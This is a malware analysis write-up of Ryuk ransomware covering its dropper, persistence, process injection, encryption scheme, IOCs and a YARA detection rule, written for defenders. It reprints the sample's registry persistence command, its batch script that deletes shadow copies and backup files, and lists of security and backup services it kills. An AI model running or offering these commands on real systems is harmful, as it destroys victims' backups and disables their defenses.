---
title: "Deep Analysis of Ryuk Ransomware"
classes: wide
header:
  teaser: /assets/images/malware-analysis/ryuk-ransomware/logo.png
ribbon: DodgerBlue
description: "Ryuk has been know to be a part of a bigger \"Triple Threat\" attack that involves Emotet and TrickBot. The first stage of this attack is the delivery of Emotet through phishing emails that contain a weaponized word document, this document contains a macro code that downloads Emotet..."
categories:
  - Malware Analysis
toc: true
---

# <u>Introduction</u>

## Attack Chain

Ryuk has been know to be a part of a bigger `"Triple Threat"` attack that involves `Emotet` and `TrickBot`.

The first stage of this attack is the delivery of Emotet through phishing emails that contain a weaponized word document, this document contains a macro code that downloads Emotet.

Once Emotet executes, it downloads another malware (usually TrickBot)  which can collect system information, steal credentials, disable AV, do lateral movement, ...

The third stage of the attack is to connect to the `C&C` server to download `Ryuk` which makes use of the lateral movement done by `TrickBot` to infect and encrypt as many systems on the network as possible.

[![1](/assets/images/malware-analysis/ryuk-ransomware/1.png)](/assets/images/malware-analysis/ryuk-ransomware/1.png)

## Ryuk overview

I will give a brief overview of how Ryuk operates then I will go into details in the upcoming sections.

Ryuk operates in two stages. The first stage is a dropper that drops the real Ryuk ransomware at another directory and exits. Then the ransomware tries to injects running processes to avoid detection. We can also see that it launches a `cmd.exe` process to modify the registry.

[![2](/assets/images/malware-analysis/ryuk-ransomware/2.png)](/assets/images/malware-analysis/ryuk-ransomware/2.png)

After that, Ryuk goes through encrypting the system files and network shares, it drops a `"Ransom Note"` at every folder it encrypts under the name `RyukReadMe.txt`.

[![3](/assets/images/malware-analysis/ryuk-ransomware/3.png)](/assets/images/malware-analysis/ryuk-ransomware/3.png)

Enough introduction, let's dive into Ryuk.

# <u>First Stage (The Dropper)</u>

`SHA256: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2`

The dropper first checks the windows `MajorVersion` and if it's equal to 5 `(windows 2000 | windows XP | Windows Server 2003)`, it drops the ransomware executable at `C:\Documents and Settings\Default User\` , otherwise it drops it at `C:\users\Public\`.

[![4](/assets/images/malware-analysis/ryuk-ransomware/4.png)](/assets/images/malware-analysis/ryuk-ransomware/4.png)

The name of the dropped executable is five randomly generated characters.

[![5](/assets/images/malware-analysis/ryuk-ransomware/5.png)](/assets/images/malware-analysis/ryuk-ransomware/5.png)

If the creation of this file failed, Ryuk drops the executable at the same directory of the dropper with replacing the last character of its name with the letter 'V' (If the dropper name is `ryuk.exe`, the dropped executable will be `ryuV.exe`).

Next we can see a call to `IsWow64Process()` and if it returns `true` (which means Ryuk is running at a 64 bit system), it writes the 64 bit binary to the dropped executable, else it writes the 32 bit binary. The 2 binary files are stored at the `.data` section.

The last step is a call to `ShellExecuteW()` to execute the second stage executable with passing it one argument which is the dropper path (This is used later to delete the dropper).

[![6](/assets/images/malware-analysis/ryuk-ransomware/6.png)](/assets/images/malware-analysis/ryuk-ransomware/6.png) | [![7](/assets/images/malware-analysis/ryuk-ransomware/7.png)](/assets/images/malware-analysis/ryuk-ransomware/7.png)

# <u>Second Stage</u>

`SHA256: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7d`

## Deleting The Dropper

Before the dropper exits, it passes its path to the second stage executable as a command line argument which in turn deletes the dropper.

[![8](/assets/images/malware-analysis/ryuk-ransomware/8.png)](/assets/images/malware-analysis/ryuk-ransomware/8.png)

## Persistence

Ryuk uses the very well know registry key to achieve persistence, It creates a new value under the name  `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchos"` and its data is set to the executable path which in my case is `"C:\users\Public\BPWPc.exe"`. 

Here is the full command:

```powershell
C:\Windows\System32\cmd.exe /C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "C:\users\Public\BPWPc.exe" /f
```

## Privilege Escalation

Ryuk uses `AdjustTokenPrivileges()` function to adjust its process security access token. The requested privilege name is `SeDebugPrivilege` and according to Microsoft docs:

> SeDebugPrivilege:
>
> Required to debug and adjust the memory of a process owned by another account.
> With this privilege, the user can attach a debugger to any process or to the kernel. 

[![9](/assets/images/malware-analysis/ryuk-ransomware/9.png)](/assets/images/malware-analysis/ryuk-ransomware/9.png)

This method is usually used by malware to perform process injection (which is done next).

## Process Injection

Ryuk goes through all running processes and stores `(ProcessName, ProcessID, ProcessType)` in a big array, `ProcessType` is an integer that is set to `1` If the domain name of the user of the process starts with "NT A" (which is "NT AUTHORITY"), otherwise the `ProcessType` is set to 2.

[![10](/assets/images/malware-analysis/ryuk-ransomware/10.png)](/assets/images/malware-analysis/ryuk-ransomware/10.png)

To make it easier, I created a structure in IDA called `ProcessInfo`.

[![11](/assets/images/malware-analysis/ryuk-ransomware/11.png)](/assets/images/malware-analysis/ryuk-ransomware/11.png)

After that, Ryuk loops through the processes' stored data to perform the process injection.

If the process name is `(csrss.exe | explorer.exe | lsaas.exe)`, Ryuk ignores that process.

[![12](/assets/images/malware-analysis/ryuk-ransomware/12.png)](/assets/images/malware-analysis/ryuk-ransomware/12.png)

The process injection technique used here is very simple, Ryuk allocates memory for its process at the target process memory space using `VirtualAllocEx()`, then it writes its process to that allocated memory using `WriteProcessMemory()`. Finally it creates a new thread using `CreateRemoteThread()` to run Ryuk's thread at the injected process.

[![13](/assets/images/malware-analysis/ryuk-ransomware/13.png)](/assets/images/malware-analysis/ryuk-ransomware/13.png)

## Building Imports

Ryuk imports its necessary functions dynamically using `LoadLibraryA()` and `GetProcAdress()`. The names of the imported functions are obfuscated so static analysis won't do very well here.

[![14](/assets/images/malware-analysis/ryuk-ransomware/14.png)](/assets/images/malware-analysis/ryuk-ransomware/14.png)

We can use a debugger to get these names rather than reversing the obfuscation algorithm.

[![15](/assets/images/malware-analysis/ryuk-ransomware/15.png)](/assets/images/malware-analysis/ryuk-ransomware/15.png)

 Here is the list of imported functions: 

<details style="color: #EEFFFF; font-family: monospace !default; font-size: 0.85em; background: #263238; border: 1px solid #263238; border-radius: 3px; padding: 10px; line-height: 1.8">
    <summary style="outline: none; cursor: pointer">
        <span style="color: darkgray">
            Expand to see more
        </span><br>
&emsp; advapi32.dll<br>
&emsp; &emsp; &ensp; CryptAcquireContextW<br>
&emsp; &emsp; &ensp; CryptDecrypt<br>
&emsp; &emsp; &ensp; CryptDeriveKey<br>
&emsp; &emsp; &ensp; CryptDestroyKey<br>
&emsp; &emsp; &ensp; CryptEncrypt<br>
&emsp; &emsp; &ensp; CryptExportKey<br>
&emsp; &emsp; &ensp; CryptGenKey<br>
&emsp; &emsp; &ensp; CryptImportKey<br>
</summary>
&emsp; &emsp; &ensp; GetUserNameA<br>
&emsp; &emsp; &ensp; GetUserNameW<br>
&emsp; &emsp; &ensp; RegCloseKey<br>
&emsp; &emsp; &ensp; RegDeleteValueW<br>
&emsp; &emsp; &ensp; RegOpenKeyExA<br>
&emsp; &emsp; &ensp; RegOpenKeyExW<br>
&emsp; &emsp; &ensp; RegQueryValueExA<br>
&emsp; &emsp; &ensp; RegSetValueExW<br>
&emsp; kernel32.dll<br>
&emsp; &emsp; &ensp; CloseHandle<br>
&emsp; &emsp; &ensp; CopyFileA<br>
&emsp; &emsp; &ensp; CopyFileW<br>
&emsp; &emsp; &ensp; CreateDirectoryW<br>
&emsp; &emsp; &ensp; CreateFileA<br>
&emsp; &emsp; &ensp; CreateFileW<br>
&emsp; &emsp; &ensp; CreateProcessA<br>
&emsp; &emsp; &ensp; CreateProcessW<br>
&emsp; &emsp; &ensp; DeleteFileW<br>
&emsp; &emsp; &ensp; ExitProcess<br>
&emsp; &emsp; &ensp; FindClose<br>
&emsp; &emsp; &ensp; FindFirstFileW<br>
&emsp; &emsp; &ensp; FindNextFileW<br>
&emsp; &emsp; &ensp; FreeLibrary<br>
&emsp; &emsp; &ensp; GetCommandLineW<br>
&emsp; &emsp; &ensp; GetCurrentProcess<br>
&emsp; &emsp; &ensp; GetDriveTypeW<br>
&emsp; &emsp; &ensp; GetFileAttributesA<br>
&emsp; &emsp; &ensp; GetFileAttributesW<br>
&emsp; &emsp; &ensp; GetFileSize<br>
&emsp; &emsp; &ensp; GetLogicalDrives<br>
&emsp; &emsp; &ensp; GetModuleFileNameA<br>
&emsp; &emsp; &ensp; GetModuleFileNameW<br>
&emsp; &emsp; &ensp; GetModuleHandleA<br>
&emsp; &emsp; &ensp; GetStartupInfoW<br>
&emsp; &emsp; &ensp; GetTickCount<br>
&emsp; &emsp; &ensp; GetVersionExW<br>
&emsp; &emsp; &ensp; GetWindowsDirectoryW<br>
&emsp; &emsp; &ensp; GlobalAlloc<br>
&emsp; &emsp; &ensp; LoadLibraryA<br>
&emsp; &emsp; &ensp; ReadFile<br>
&emsp; &emsp; &ensp; SetFileAttributesA<br>
&emsp; &emsp; &ensp; SetFileAttributesW<br>
&emsp; &emsp; &ensp; SetFilePointer<br>
&emsp; &emsp; &ensp; Sleep<br>
&emsp; &emsp; &ensp; VirtualAlloc<br>
&emsp; &emsp; &ensp; VirtualFree<br>
&emsp; &emsp; &ensp; WinExec<br>
&emsp; &emsp; &ensp; Wow64DisableWow64FsRedirection<br>
&emsp; &emsp; &ensp; Wow64RevertWow64FsRedirection<br>
&emsp; &emsp; &ensp; WriteFile<br>
&emsp; ole32.dll<br>
&emsp; &emsp; &ensp; CoCreateInstance<br>
&emsp; &emsp; &ensp; CoInitialize<br>
&emsp; Shell32.dll<br>
&emsp; &emsp; &ensp; ShellExecuteA<br>
&emsp; &emsp; &ensp; ShellExecuteW<br>
&emsp; mpr.dll<br>
&emsp; &emsp; &ensp; WNetCloseEnum<br>
&emsp; &emsp; &ensp; WNetEnumResourceW<br>
&emsp; &emsp; &ensp; WNetOpenEnumW<br>
&emsp; Iphlpapi.dll<br>
&emsp; &emsp; &ensp; GetIpNetTable<br>
</details>


## Killing Processes

Ryuk has a long list of predefined services and processes to kill using `net stop` and `taskkill /IM` respectively.

Here is the list of services:

<details style="color: #EEFFFF; font-family: monospace !default; font-size: 0.85em; background: #263238; border: 1px solid #263238; border-radius: 3px; padding: 10px; line-height: 1.8;">
    <summary style="outline: none; cursor: pointer">
        <span style="color: darkgray">
            Expand to see more
        </span><br>
        &emsp; &emsp; Acronis VSS Provider <br>
        &emsp; &emsp; Enterprise Client Service <br>
        &emsp; &emsp; Sophos Agent <br>
        &emsp; &emsp; Sophos AutoUpdate Service <br>
        &emsp; &emsp; Sophos Clean Service <br>
        &emsp; &emsp; Sophos Device Control Service <br>
        &emsp; &emsp; Sophos File Scanner Service <br>
        &emsp; &emsp; Sophos Health Service <br>
        &emsp; &emsp; Sophos MCS Agent <br>
        &emsp; &emsp; Sophos MCS Client <br>
 </summary>
		&emsp; &emsp; Sophos Message Router <br>
        &emsp; &emsp; Sophos Safestore Service <br>
        &emsp; &emsp; Sophos System Protection Service <br>
        &emsp; &emsp; Sophos Web Control Service <br>
        &emsp; &emsp; SQLsafe Backup Service <br>
        &emsp; &emsp; SQLsafe Filter Service <br>
        &emsp; &emsp; Symantec System Recovery <br>
        &emsp; &emsp; Veeam Backup Catalog Data Service <br>
        &emsp; &emsp; AcronisAgent <br>
        &emsp; &emsp; AcrSch2Svc <br>
        &emsp; &emsp; Antivirus <br>
        &emsp; &emsp; ARSM <br>
        &emsp; &emsp; BackupExecAgentAccelerator <br>
        &emsp; &emsp; BackupExecAgentBrowser <br>
        &emsp; &emsp; BackupExecDeviceMediaService <br>
        &emsp; &emsp; BackupExecJobEngine <br>
        &emsp; &emsp; BackupExecManagementService <br>
        &emsp; &emsp; BackupExecRPCService <br>
        &emsp; &emsp; BackupExecVSSProvider <br>
        &emsp; &emsp; bedbg <br>
        &emsp; &emsp; DCAgent <br>
        &emsp; &emsp; EPSecurityService <br>
        &emsp; &emsp; EPUpdateService <br>
        &emsp; &emsp; EraserSvc11710 <br>
        &emsp; &emsp; EsgShKernel <br>
        &emsp; &emsp; FA_Scheduler <br>
        &emsp; &emsp; IISAdmin <br>
        &emsp; &emsp; IMAP4Svc <br>
        &emsp; &emsp; macmnsvc <br>
        &emsp; &emsp; masvc <br>
        &emsp; &emsp; MBAMService <br>
        &emsp; &emsp; MBEndpointAgent <br>
        &emsp; &emsp; McAfeeEngineService <br>
        &emsp; &emsp; McAfeeFramework <br>
        &emsp; &emsp; McAfeeFrameworkMcAfeeFramework <br>
        &emsp; &emsp; McShield <br>
        &emsp; &emsp; McTaskManager <br>
        &emsp; &emsp; mfemms <br>
        &emsp; &emsp; mfevtp <br>
        &emsp; &emsp; MMS <br>
        &emsp; &emsp; mozyprobackup <br>
        &emsp; &emsp; MsDtsServer <br>
        &emsp; &emsp; MsDtsServer100 <br>
        &emsp; &emsp; MsDtsServer110 <br>
        &emsp; &emsp; MSExchangeES <br>
        &emsp; &emsp; MSExchangeIS <br>
        &emsp; &emsp; MSExchangeMGMT <br>
        &emsp; &emsp; MSExchangeMTA <br>
        &emsp; &emsp; MSExchangeSA <br>
        &emsp; &emsp; MSExchangeSRS <br>
        &emsp; &emsp; MSOLAP$SQL_2008 <br>
        &emsp; &emsp; MSOLAP$SYSTEM_BGC <br>
        &emsp; &emsp; MSOLAP$TPS <br>
        &emsp; &emsp; MSOLAP$TPSAMA <br>
        &emsp; &emsp; MSSQL$BKUPEXEC <br>
        &emsp; &emsp; MSSQL$ECWDB2 <br>
        &emsp; &emsp; MSSQL$PRACTICEMGT <br>
        &emsp; &emsp; MSSQL$PRACTTICEBGC <br>
        &emsp; &emsp; MSSQL$PROFXENGAGEMENT <br>
        &emsp; &emsp; MSSQL$SBSMONITORING <br>
        &emsp; &emsp; MSSQL$SHAREPOINT <br>
        &emsp; &emsp; MSSQL$SQL_2008 <br>
        &emsp; &emsp; MSSQL$SYSTEM_BGC <br>
        &emsp; &emsp; MSSQL$TPS <br>
        &emsp; &emsp; MSSQL$TPSAMA <br>
        &emsp; &emsp; MSSQL$VEEAMSQL2008R2 <br>
        &emsp; &emsp; MSSQL$VEEAMSQL2012 <br>
        &emsp; &emsp; MSSQLFDLauncher <br>
        &emsp; &emsp; MSSQLFDLauncher$PROFXENGAGEMENT <br>
        &emsp; &emsp; MSSQLFDLauncher$SBSMONITORING <br>
        &emsp; &emsp; MSSQLFDLauncher$SHAREPOINT <br>
        &emsp; &emsp; MSSQLFDLauncher$SQL_2008 <br>
        &emsp; &emsp; MSSQLFDLauncher$SYSTEM_BGC <br>
        &emsp; &emsp; MSSQLFDLauncher$TPS <br>
        &emsp; &emsp; MSSQLFDLauncher$TPSAMA <br>
        &emsp; &emsp; MSSQLSERVER <br>
        &emsp; &emsp; MSSQLServerADHelper100 <br>
        &emsp; &emsp; MSSQLServerOLAPService <br>
        &emsp; &emsp; MySQL80 <br>
        &emsp; &emsp; MySQL57 <br>
        &emsp; &emsp; ntrtscan <br>
        &emsp; &emsp; OracleClientCache80 <br>
        &emsp; &emsp; PDVFSService <br>
        &emsp; &emsp; POP3Svc <br>
        &emsp; &emsp; ReportServer <br>
        &emsp; &emsp; ReportServer$SQL_2008 <br>
        &emsp; &emsp; ReportServer$SYSTEM_BGC <br>
        &emsp; &emsp; ReportServer$TPS <br>
        &emsp; &emsp; ReportServer$TPSAMA <br>
        &emsp; &emsp; RESvc <br>
        &emsp; &emsp; sacsvr <br>
        &emsp; &emsp; SamSs <br>
        &emsp; &emsp; SAVAdminService <br>
        &emsp; &emsp; SAVService <br>
        &emsp; &emsp; SDRSVC <br>
        &emsp; &emsp; SepMasterService <br>
        &emsp; &emsp; ShMonitor <br>
        &emsp; &emsp; Smcinst <br>
        &emsp; &emsp; SmcService <br>
        &emsp; &emsp; SMTPSvc <br>
        &emsp; &emsp; SNAC <br>
        &emsp; &emsp; SntpService <br>
        &emsp; &emsp; sophossps <br>
        &emsp; &emsp; SQLAgent$BKUPEXEC <br>
        &emsp; &emsp; SQLAgent$ECWDB2 <br>
        &emsp; &emsp; SQLAgent$PRACTTICEBGC <br>
        &emsp; &emsp; SQLAgent$PRACTTICEMGT <br>
        &emsp; &emsp; SQLAgent$PROFXENGAGEMENT <br>
        &emsp; &emsp; SQLAgent$SBSMONITORING <br>
        &emsp; &emsp; SQLAgent$SHAREPOINT <br>
        &emsp; &emsp; SQLAgent$SQL_2008 <br>
        &emsp; &emsp; SQLAgent$SYSTEM_BGC <br>
        &emsp; &emsp; SQLAgent$TPS <br>
        &emsp; &emsp; SQLAgent$TPSAMA <br>
        &emsp; &emsp; SQLAgent$VEEAMSQL2008R2 <br>
        &emsp; &emsp; SQLAgent$VEEAMSQL2012 <br>
        &emsp; &emsp; SQLBrowser <br>
        &emsp; &emsp; SQLSafeOLRService <br>
        &emsp; &emsp; SQLSERVERAGENT <br>
        &emsp; &emsp; SQLTELEMETRY <br>
        &emsp; &emsp; SQLTELEMETRY$ECWDB2 <br>
        &emsp; &emsp; SQLWriter <br>
        &emsp; &emsp; SstpSvc <br>
        &emsp; &emsp; svcGenericHost <br>
        &emsp; &emsp; swi_filter <br>
        &emsp; &emsp; swi_service <br>
        &emsp; &emsp; swi_update_64 <br>
        &emsp; &emsp; TmCCSF <br>
        &emsp; &emsp; tmlisten <br>
        &emsp; &emsp; TrueKey <br>
        &emsp; &emsp; TrueKeyScheduler <br>
        &emsp; &emsp; TrueKeyServiceHelper <br>
        &emsp; &emsp; UI0Detect <br>
        &emsp; &emsp; VeeamBackupSvc <br>
        &emsp; &emsp; VeeamBrokerSvc <br>
        &emsp; &emsp; VeeamCatalogSvc <br>
        &emsp; &emsp; VeeamCloudSvc <br>
        &emsp; &emsp; VeeamDeploymentService <br>
        &emsp; &emsp; VeeamDeploySvc <br>
        &emsp; &emsp; VeeamEnterpriseManagerSvc <br>
        &emsp; &emsp; VeeamMountSvc <br>
        &emsp; &emsp; VeeamNFSSvc <br>
        &emsp; &emsp; VeeamRESTSvc <br>
        &emsp; &emsp; VeeamTransportSvc <br>
        &emsp; &emsp; W3Svc <br>
        &emsp; &emsp; wbengine <br>
        &emsp; &emsp; WRSVC <br>
        &emsp; &emsp; MSSQL$VEEAMSQL2008R2 <br>
        &emsp; &emsp; SQLAgent$VEEAMSQL2008R2 <br>
        &emsp; &emsp; VeeamHvIntegrationSvc <br>
        &emsp; &emsp; swi_update <br>
        &emsp; &emsp; SQLAgent$CXDB <br>
        &emsp; &emsp; SQLAgent$CITRIX_METAFRAME <br>
        &emsp; &emsp; SQL Backups <br>
        &emsp; &emsp; MSSQL$PROD <br>
        &emsp; &emsp; Zoolz 2 Service <br>
        &emsp; &emsp; MSSQLServerADHelper <br> 
        &emsp; &emsp; SQLAgent$PROD <br> 
        &emsp; &emsp; msftesql$PROD <br> 
        &emsp; &emsp; NetMsmqActivator <br>
        &emsp; &emsp; EhttpSrv <br>
        &emsp; &emsp; ekrn <br>
        &emsp; &emsp; ESHASRV <br>
        &emsp; &emsp; MSSQL$SOPHOS <br>
        &emsp; &emsp; SQLAgent$SOPHOS <br>
        &emsp; &emsp; AVP <br>
        &emsp; &emsp; klnagent <br>
        &emsp; &emsp; MSSQL$SQLEXPRESS <br>
        &emsp; &emsp; SQLAgent$SQLEXPRESS <br>
        &emsp; &emsp; wbengine <br>
        &emsp; &emsp; kavfsslp <br>
        &emsp; &emsp; KAVFSGT <br>
        &emsp; &emsp; KAVFS <br>
        &emsp; &emsp; mfefire <br>
</details>
<br>And here is the list of processes:

<details style="color: #EEFFFF; font-family: monospace !default; font-size: 0.85em; background: #263238; border: 1px solid #263238; border-radius: 3px; padding: 10px; line-height: 1.8;">
    <summary style="outline: none; cursor: pointer">
        <span style="color: darkgray">
            Expand to see more
        </span><br>
&emsp; &emsp; zoolz.exe <br>
&emsp; &emsp; agntsvc.exe <br>
&emsp; &emsp; dbeng50.exe <br>
&emsp; &emsp; dbsnmp.exe <br>
&emsp; &emsp; encsvc.exe <br>
&emsp; &emsp; excel.exe <br>
&emsp; &emsp; firefoxconfig.exe <br>
&emsp; &emsp; infopath.exe <br>
</summary>
&emsp; &emsp; isqlplussvc.exe <br>
&emsp; &emsp; msaccess.exe <br>
&emsp; &emsp; msftesql.exe <br>
&emsp; &emsp; mspub.exe <br>
&emsp; &emsp; mydesktopqos.exe <br>
&emsp; &emsp; mydesktopservice.exe <br>
&emsp; &emsp; mysqld.exe <br>
&emsp; &emsp; mysqld-nt.exe <br>
&emsp; &emsp; mysqld-opt.exe <br>
&emsp; &emsp; ocautoupds.exe <br>
&emsp; &emsp; ocomm.exe <br>
&emsp; &emsp; ocssd.exe <br>
&emsp; &emsp; onenote.exe <br>
&emsp; &emsp; oracle.exe <br>
&emsp; &emsp; outlook.exe <br>
&emsp; &emsp; powerpnt.exe <br>
&emsp; &emsp; sqbcoreservice.exe <br>
&emsp; &emsp; sqlagent.exe <br>
&emsp; &emsp; sqlbrowser.exe <br>
&emsp; &emsp; sqlservr.exe <br>
&emsp; &emsp; sqlwriter.exe <br>
&emsp; &emsp; steam.exe <br>
&emsp; &emsp; synctime.exe <br>
&emsp; &emsp; tbirdconfig.exe <br>
&emsp; &emsp; thebat.exe <br>
&emsp; &emsp; thebat64.exe <br>
&emsp; &emsp; thunderbird.exe <br>
&emsp; &emsp; visio.exe <br>
&emsp; &emsp; winword.exe <br>
&emsp; &emsp; wordpad.exe <br>
&emsp; &emsp; xfssvccon.exe <br>
&emsp; &emsp; tmlisten.exe <br>
&emsp; &emsp; PccNTMon.exe <br>
&emsp; &emsp; CNTAoSMgr.exe <br>
&emsp; &emsp; Ntrtscan.exe <br>
&emsp; &emsp; mbamtray.exe <br>
</details>
## Deleting Backups

Ryuk drops a batch script at `C:\Users\Public\window.bat` which deletes all shadow copies and possible backups, then the script deletes itself.

```bat
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
del %0
```

## The Encryption Process

Ryuk uses a multi threading approach for the encryption process, it creates a new thread for each file it encrypts which makes it very fast.

It starts enumerating files using `FindFirstFileW()` and `FindNextFileW()` then it passes each file name to a new encryption thread. Note that Ryuk avoids encrypting these file extensions:

```
.dll
.lnk
.hrmlog
.ini
.exe
```

Each encryption thread starts by generating a random 256 AES encryption key using `CryptGenKey()`, Ryuk utilizes the WindowsCrypto API for the encryption.

[![16](/assets/images/malware-analysis/ryuk-ransomware/16.png)](/assets/images/malware-analysis/ryuk-ransomware/16.png)

Then it goes into the typical encryption loop, the files are encrypted in chunks with a chunk size of `1000000 bytes`.

[![17](/assets/images/malware-analysis/ryuk-ransomware/17.png)](/assets/images/malware-analysis/ryuk-ransomware/17.png) | [![18](/assets/images/malware-analysis/ryuk-ransomware/18.png)](/assets/images/malware-analysis/ryuk-ransomware/18.png)

Finally Ryuk write a metadata block of size `274 bytes` at the end of the file. The first `6 bytes` are the keyword `HERMES`.

[![19](/assets/images/malware-analysis/ryuk-ransomware/19.png)](/assets/images/malware-analysis/ryuk-ransomware/19.png)

After that, The AES key is encrypted with an RSA public key before it's written to the end of the file and then exported using `CryptExportKey()`, This function generates `12 bytes of Blob information + 256 bytes (the encrypted key)`.

[![20](/assets/images/malware-analysis/ryuk-ransomware/20.png)](/assets/images/malware-analysis/ryuk-ransomware/20.png)

The RSA public key is embedded in the executable, it's imported using `CryptImportKey()` and passed to every encryption thread.

[![21](/assets/images/malware-analysis/ryuk-ransomware/21.png)](/assets/images/malware-analysis/ryuk-ransomware/21.png) | [![22](/assets/images/malware-analysis/ryuk-ransomware/22.png)](/assets/images/malware-analysis/ryuk-ransomware/22.png)

We can see at the end of the encryption routine a check if the keyword `HERMES` is present at the end of the file (which indicates the file is encrypted).

This check is actually done before encrypting the file to avoid encrypting it twice.

[![23](/assets/images/malware-analysis/ryuk-ransomware/23.png)](/assets/images/malware-analysis/ryuk-ransomware/23.png)

Here is an example of the complete metadata block:

[![24](/assets/images/malware-analysis/ryuk-ransomware/24.png)](/assets/images/malware-analysis/ryuk-ransomware/24.png)

## Encrypting Network Shares

Ryuk enumerates network shares using `WNetOpenEnumW()` and `WNetEnumResourceA()` respectively.

[![25](/assets/images/malware-analysis/ryuk-ransomware/25.png)](/assets/images/malware-analysis/ryuk-ransomware/25.png)

For each network resource found, the resourceâ€™s name will be appended to a list separated by a semicolon. This list will be used later to encrypt these network shares with the same encryption process above.

## IOCs

#### <u>Hashes</u>

Ryuk: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7 

Dropper: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2

#### <u>Files</u>

C:\Users\Public\window.bat

#### <u>Registry</u>

HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

#### <u>Emails</u>

WayneEvenson@protonmail[.]com

WayneEvenson@tutanota[.]com

## Yara Rule

```css
rule Ryuk
{
    meta:
        author = "N1ght-W0lf"
        description = "Detect Ryuk Samples"
        date = "2020-05-08"
    strings:
        $s1 = "RyukReadMe.txt" ascii wide
        $s2 = "No system is safe" ascii wide
        $s3 = "svchos" ascii wide fullword
        $s4 = "vssadmin Delete Shadows /all /quiet" ascii wide
        $s5 = "UNIQUE_ID_DO_NOT_REMOVE" ascii wide
        $s7 = "\\users\\Public\\window.bat" ascii wide
        $s6 = "HERMES" ascii wide

    condition:
        5 of them
}
```

## External References

[https://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-of-ryuk-ransomware/](https://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-of-ryuk-ransomware/)

[https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/](https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/)

[https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/](https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672)

[https://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-using-CryptoAPI](https://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-using-CryptoAPI)